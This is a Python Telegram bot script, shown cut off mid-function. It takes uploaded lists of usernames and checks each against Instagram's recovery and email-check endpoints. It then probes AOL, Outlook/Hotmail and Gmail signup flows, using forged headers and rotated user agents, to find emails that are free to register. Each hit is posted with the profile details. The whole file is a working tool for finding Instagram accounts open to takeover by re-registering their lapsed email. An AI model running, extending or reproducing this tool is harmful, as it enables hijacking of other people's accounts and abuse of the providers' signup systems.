import telebot ; import requests ; import uuid ; import os ;import queue ;import threading ;import secrets ;import time ;import hashlib ; import base64 ; import re ; import random ; import instagramtolle
from random import choice,randrange,randint;from user_agent import generate_user_agent
""" الكود مكتوب بكل حنية وحنان رجائن لا تعبث به """
hit=0
good_insta,good_gmail,bad_gmail,bad_insta,good_hot,bad_hot,good_out,bad_out,good_aol,bad_aol=0,0,0,0,0,0,0,0,0,0
fast=20 #سرعه الثردنك لا تسرع حتى لا تنحظر 
bot=telebot.TeleBot(token=input("Token ..  Bot : "),threaded=20)
def date_l7n(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  else:
   return "2020-2023"
 except:
 	return False
def cookis():
        user_agent = "Mozilla/5.0 (" + ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 11_3", "iPhone; CPU iPhone OS 15_2 like Mac OS X", "iPad; CPU OS 14_4 like Mac OS X"][random.randint(0, 3)] + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str(random.randint(90, 120)) + ".0." + str(random.randint(4000, 5000)) + "." + str(random.randint(100, 999)) + " Safari/537.36 Edg/" + str(random.randint(100, 125)) + ".0.0.0"
        headers={'user-agent': str(user_agent)}
        response=requests.get('https://login.aol.com/account/create',headers=headers)
        AS=response.cookies.get_dict()['AS']
        A1=response.cookies.get_dict()['A1']
        A3=response.cookies.get_dict()['A3']
        A1S=response.cookies.get_dict()['A1S']
        specData=response.text.split('''name="attrSetIndex">
        <input type="hidden" value="''')[1].split(f'" name="specData">')[0]
        specId=response.text.split('''name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" value="''')[1].split(f'" name="specId">')[0]
        crumb=response.text.split('''name="cacheStored">
        <input type="hidden" value="''')[1].split(f'" name="crumb">')[0]
        sessionIndex=response.text.split('''"acrumb">
        <input type="hidden" value="''')[1].split(f'" name="sessionIndex">')[0]
        acrumb=response.text.split('''name="crumb">
        <input type="hidden" value="''')[1].split(f'" name="acrumb">')[0]
        return AS, A1, A3, A1S, specData, specId, crumb , sessionIndex, acrumb
def check_aol(email):

            AS, A1, A3, A1S, specData, specId, crumb , sessionIndex, acrumb = cookis()
            cookies = {
        'gpp': 'DBAA',
        'gpp_sid': '-1',
        'A1':A1,
        'A3':A3,
        'A1S':A1S,
        '__gads': 'ID=c0M0fd00676f0ea1:T='+'4'+':RT='+'5'+':S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
        '__gpi': 'UID=00000cf0e8904e94:T='+'7'+':RT='+'6'+':S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
        'cmp': 't='+'0'+'&j=0&u=1---',
        'AS': AS,
    }
            headers = {
        'authority': 'login.aol.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://login.aol.com',
        'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
            params = {
        'validateField': 'userId',
    }
            data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&mm=&dd=&yyyy=&signup='
            response = requests.post('https://login.aol.com/account/module/create', params=params,  headers=headers, data=data,cookies=cookies).text
            if '{"errors":[{"name":"firstName","error":"FIELD_EMPTY"},{"name":"lastName","error":"FIELD_EMPTY"},{"name":"birthDate","error":"INVALID_BIRTHDATE"},{"name":"password","error":"FIELD_EMPTY"}]}' in response:
                  return True
            else:
                   return False
def cheeckEmail(email):
    rnd=str(randint(150, 999))
    user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][randint(0, 5)] + "; " + str(randint(100, 1300)) + "dpi; " + str(randint(200, 2000)) + "x" + str(randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(randint(111,999))+")"   
    files=[
  ]
    headers = {
  }        
    choice_ = choice("13")
    if choice_ == "1":
            data = {        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
            headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
            try:
                re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data)
                if ('"can_recover_with_code"')in re.text:
                    return True	                            	             
                else:
                    return False
            except Exception as e:""    
    elif choice_ == "3":
            url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
            headers = {	
			 'Host': 'www.instagram.com',
			 'origin': 'https://www.instagram.com',
			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
			 'user-agent': str(user_agent)}
            data = {
		'email': str(email)
		}
            try:
                response = requests.post(url,headers=headers,data=data)
                if 'email_is_taken' in response.text:
                    return True
                else:
                    return False
            except Exception as e:
                ""
def rest(email):
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data)
        if ('"can_recover_with_code"')in re.text:
            sdd=re.json()["email"]
            return sdd
        elif "user_not_found"in re.text:
            return "Dont Link"   	             
        else:
            return None
    except Exception as e:
        return None

def info(email,chat_id):
    #by ~ demo - @n_c_p
    global hit
    hit+=1
    username=email.split("@")[0]
    oo = f"-1::{username}"
    ee = base64.b64encode(oo.encode('utf-8')).decode('utf-8')
    try:
        headers = {
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
        rr = requests.get(f'https://instanavigation.net/api/v1/stories/{ee}', headers=headers).json()
        ids = rr['user_info']['id']
        full_name = rr['user_info']['full_name']
        is_private = rr['user_info']['is_private']
        media_count = rr['user_info']['posts']
        followers = rr['user_info']['followers']
        following = rr['user_info']['following']
        tlg=f'''
~~~~~~~~~~~~~~~~~~~~~~~~~
𝙜𝙢𝙖𝙞𝙡 :{email}
𝙧𝙚𝙨𝙚𝙩 : {rest(username)}
𝙣𝙖𝙢𝙚 : {full_name}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 {username}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {following}
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {followers}
𝙞𝙙 : {ids}
𝙥𝙧𝙞𝙫𝙖𝙩𝙚 : {is_private}
𝙥𝙤𝙨𝙩 : {media_count}
𝙙𝙖𝙩𝙚 : {date_l7n(ids)}
𝘱𝘳𝘰𝘨𝘳𝘢𝘮𝘮𝘦𝘳.. @hsopyt
~~~~~~~~~~~~~~~~~~~~~~~~~
          '''
        bot.send_message(chat_id,tlg)
    except Exception as e:
        tlg=f'''
~~~~~~~~~~~~~~~~~~~~~~~~~
𝙜𝙢𝙖𝙞𝙡 :{email}
𝙧𝙚𝙨𝙚𝙩 : {rest(username)}
𝘱𝘳𝘰𝘨𝘳𝘢𝘮𝘮𝘦𝘳.. @hsopyt
~~~~~~~~~~~~~~~~~~~~~~~~~
''';bot.send_message(chat_id,tlg)
def check_out_hot(email):
	reqz=requests.Session()
	try:
		headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
        "Host": "signup.live.com",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest"
            }
		url="https://signup.live.com/signup.aspx?lic=1"
		response=reqz.get(url, headers=headers)
		apiCanary = re.search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
		apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii");url  = "https://signup.live.com/API/CheckAvailableSigninNames";json = {
        "signInName": email,
        "includeSuggestions": True}
		res = reqz.post(url, headers={
        "Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
        "canary":apiCanary
        }, json=json)
		if res.json()['isAvailable']==False:
			return False
		elif res.json()['isAvailable']==True:
			return True
	except Exception as e:print(e)
def Ch(email):
    if '@' in email:email=email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    try:
        name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
        birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
        s = requests.Session()
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://accounts.google.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-browser-channel': 'stable',
            'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
            'x-browser-year': '2024',
        }

        params = {
            'biz': 'false',
            'continue': 'https://mail.google.com/mail/u/0/',
            'ddm': '1',
            'emr': '1',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'followup': 'https://mail.google.com/mail/u/0/',
            'osid': '1',
            'service': 'mail',
        }

        r = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        tl=r.url.split('TL=')[1]
        s1= r.text.split('"Qzxixc":"')[1].split('"')[0]
        at = r.text.split('"SNlM0e":"')[1].split('"')[0]
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

        r = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
        ).text



        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)

        r = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
        ).text



        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

        r = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
        ).text
        if 'steps/signup/password'in r:return True
        else:return False
    except:""
@bot.message_handler(commands=["start"])
def hsn1(message):
    but11=telebot.types.InlineKeyboardButton(text="check_out",callback_data="but11")
    but1=telebot.types.InlineKeyboardButton(text="check_gmail",callback_data="but1")
    but12=telebot.types.InlineKeyboardButton(text="check_hot",callback_data="but12")
    but13=telebot.types.InlineKeyboardButton(text="check_aol",callback_data="but13")
    owner3=telebot.types.InlineKeyboardButton(text="Acc Owner",url="https://t.me/hsopyt")
    adTYpes=telebot.types.InlineKeyboardMarkup(row_width=2)
    adTYpes.add(but1,but11,but12,but13,owner3)
    bot.send_message(message.chat.id,text="welcome bot /check_gmail > ",reply_markup=adTYpes)
@bot.callback_query_handler(func=lambda call:True)
def call1(call):
    if call.data=="but1":
        hs1=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="Send Your File : ")
        bot.register_next_step_handler(hs1,gmail)
    elif call.data=="but11":
        hs2=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="Send Your File : ")
        bot.register_next_step_handler(hs2,out)
    elif call.data=="but12":
        hs3=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="Send Your File : ")
        bot.register_next_step_handler(hs3,hot)
    elif call.data=="but13":
        hs4=bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="Send Your File : ")
        bot.register_next_step_handler(hs4,aol)
def aol(message):
    global fast
    if message.document:
        bnds=bot.get_file(message.document.file_id)
        bns2ds=bot.download_file(bnds.file_path)
        with open("test.txt","wb") as t:
            t.write(bns2ds)
        bot.send_message(message.from_user.id,"wait i will read the six file successfully...")
        bns_qda=queue.Queue()
        with open("test.txt",'r')as f:
            for line in f:
                bns_qda.put(line.strip())
        threads=[]
        for _ in range(fast):
            thread = threading.Thread(target=home_aol, args=(bns_qda, message.chat.id))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
def hot(message):
    global fast
    if message.document:
        bnd=bot.get_file(message.document.file_id)
        bns2d=bot.download_file(bnd.file_path)
        with open("test.txt","wb") as t:
            t.write(bns2d)
        bot.send_message(message.from_user.id,"wait i will read the six file successfully...")
        bns_qd=queue.Queue()
        with open("test.txt",'r')as f:
            for line in f:
                bns_qd.put(line.strip())
        threads=[]
        for _ in range(fast):
            thread = threading.Thread(target=home_hot, args=(bns_qd, message.chat.id))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
def out(message):
    global fast
    if message.document:
        bns=bot.get_file(message.document.file_id)
        bns2=bot.download_file(bns.file_path)
        with open("test.txt","wb") as t:
            t.write(bns2)
        bot.send_message(message.from_user.id,"wait i will read the six file successfully...")
        bns_q=queue.Queue()
        with open("test.txt",'r')as f:
            for line in f:
                bns_q.put(line.strip())
        threads=[]
        for _ in range(fast):
            thread = threading.Thread(target=home_out, args=(bns_q, message.chat.id))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
def home_aol(bnses,chat_id):
    while not bnses.empty():
        line = bnses.get()
        try:
            email= line
            hso4(email, chat_id)
        except ValueError:
            pass
        finally:
            bnses.task_done()
def home_hot(bnse,chat_id):
    while not bnse.empty():
        line = bnse.get()
        try:
            email= line
            hso3(email, chat_id)
        except ValueError:
            pass
        finally:
            bnse.task_done()
def home_out(bnse,chat_id):
    while not bnse.empty():
        line = bnse.get()
        try:
            email= line
            hso2(email, chat_id)
        except ValueError:
            pass
        finally:
            bnse.task_done()
def gmail(message):
    if message.document:
        bno1 = bot.get_file(message.document.file_id)
        bno2=bot.download_file(bno1.file_path)
        with open("test.txt","wb") as t:
            t.write(bno2)
        bot.send_message(message.from_user.id,"wait i will read the six file successfully...")
        bno_q=queue.Queue()
        with open("test.txt",'r')as f:
            for line in f:
                bno_q.put(line.strip())
        threads=[]
        for _ in range(30):
            thread = threading.Thread(target=home_gm, args=(bno_q, message.chat.id))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
def home_gm(hsn,chat_id):
    while not hsn.empty():
        line = hsn.get()
        try:
            email= line
            hso1(email, chat_id)
        except ValueError:
            pass
        finally:
            hsn.task_done()
def hso4(email,chat_id):
    global good_aol,bad_aol,good_insta,bad_insta
    aa=email+"@aol.com"
    ibnos=cheeckEmail(aa)
    if ibnos==True:

        bns=check_aol(email)
        print(bns)
        good_insta+=1
        if bns ==True:
            good_aol+=1
            info(aa,chat_id)
        elif bns== False:
            bad_aol+=1
    elif ibnos== False:
        bad_insta+=1
def hso3(email,chat_id):
    global good_hot,bad_hot,good_insta,bad_insta
    aa=email+"@hotmail.com"
